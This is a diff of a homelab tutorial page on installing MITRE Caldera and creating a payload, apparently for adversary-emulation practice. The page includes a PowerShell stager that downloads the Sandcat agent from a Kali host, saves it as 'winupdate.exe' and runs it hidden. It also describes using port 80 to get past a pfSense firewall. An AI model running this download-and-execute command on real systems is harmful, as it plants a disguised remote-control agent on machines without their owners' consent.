@@ -1,7 +1,15 @@
 ---
 title: Installing MITRE Caldera and Creating a Payload
-sidebar_position: 0
+sidebar_position: 1
 slug: /3547b0eb-61a4-80c4-8540-e431b87b54d7
+tags:
+  - Adversary Emulation
+  - Caldera
+  - Homelab
+  - MITRE ATT&CK
+  - PowerShell
+  - Windows
+  - pfSense
 ---
 
 
@@ -70,9 +78,9 @@ To bypass the pfSense firewall, which only permits traffic on ports 80 and 443, 
 
 1. **Platform:** Select **Windows**.
 2. **`app.contact.http`****:** Modify this value to `http://<Your_Kali_Machine_IP>:80`. This specific configuration step is crucial for successfully bypassing the firewall.
-3. Caldera will automatically generate a PowerShell command block (typically beginning with `$server="http://..."; $url="$server/file/download"...`).
+3. Caldera will automatically generate a PowerShell command block
 
-![](./3547b0eb-61a4-80c4-8540-e431b87b54d7.3557b0eb-61a4-8041-b0d4-e949b6d3fb78.png)
+![](./3547b0eb-61a4-80c4-8540-e431b87b54d7.3627b0eb-61a4-8009-9a1c-e5e809416735.png)
 
 
 **Execution:**
@@ -87,20 +95,20 @@ Here is the provided payload structure to be executed on `ws01`:
 
 
 ```c++
-$server="http://192.168.253.128:80";
-$url="$server/file/download";
-$exePath="$env:USERPROFILE\AppData\Local\Temp\winupdate.exe";
+$server = "http://192.168.253.128:80";
+$url = "$server/file/download";
+$exePath = "$env:TEMP\winupdate.exe";
 
-$wc=New-Object System.Net.WebClient;
+$wc = New-Object System.Net.WebClient;
 $wc.Headers.add("platform","windows");
 $wc.Headers.add("file","sandcat.go");
-$data=$wc.DownloadData($url);
 
-get-process | ? {$_.modules.filename -eq $exePath} | stop-process -f -ea ignore;
+$data = $wc.DownloadData($url);
+
+get-process | ? {$_.modules.filename -like $exePath} | stop-process -f;
 rm -force $exePath -ea ignore;
 
-[io.file]::WriteAllBytes($exePath,$data) | Out-Null;
-
+[io.file]::WriteAllBytes($exePath, $data) | Out-Null;
 Start-Process -FilePath $exePath -ArgumentList "-server $server -group red" -WindowStyle hidden;
 ```
 
